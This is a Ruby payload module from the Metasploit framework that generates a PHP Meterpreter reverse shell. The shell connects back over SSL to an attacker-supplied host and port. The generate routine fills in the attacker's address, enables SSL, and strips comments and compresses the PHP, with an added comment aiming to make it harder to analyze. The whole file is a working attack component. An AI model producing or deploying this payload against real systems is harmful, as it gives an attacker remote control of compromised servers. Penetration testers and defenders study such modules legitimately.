##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp_ssl'
require 'msf/base/sessions/meterpreter_php'
require 'msf/base/sessions/meterpreter_options'

module MetasploitModule

  CachedSize = 25141

  include Msf::Payload::Single
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'PHP Meterpreter, Reverse TCP Inline Using SSL',
      'Description'   => 'Connect back to attacker with SSL and spawn a Meterpreter server (PHP)',
      'Author'        => ['RageLtMan <rageltman[at]sempervictus>'],
      'Platform'      => 'php',
      'Arch'          => ARCH_PHP,
      'Handler'       => Msf::Handler::ReverseTcpSsl,
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_Php_Php))
  end

  def generate
    file = File.join(Msf::Config.data_directory, "meterpreter", 'meterpreter_ssl.php')
    met = File.open(file, "rb") {|f|
      f.read(f.stat.size)
    }
    met.gsub!("ion connect($ipaddr, $port, $proto='tcp')","ion connect($ipaddr, $port, $proto='ssl')")
    met.gsub!("127.0.0.1", datastore['LHOST'].to_s) if datastore['LHOST']
    met.gsub!("4444", datastore['LPORT'].to_s) if datastore['LPORT']
    # Enable SSL mode
    met.gsub!('($ipaddr, $port, $proto=\'tcp\')','($ipaddr, $port, $proto=\'ssl\')')
    # XXX When this payload is more stable, remove comments and compress
    # whitespace to make it smaller and a bit harder to analyze
    met.gsub!(/#.*$/, '')
    met = Rex::Text.compress(met)
    #vprint_good(met.to_s)
    return met
  end
end
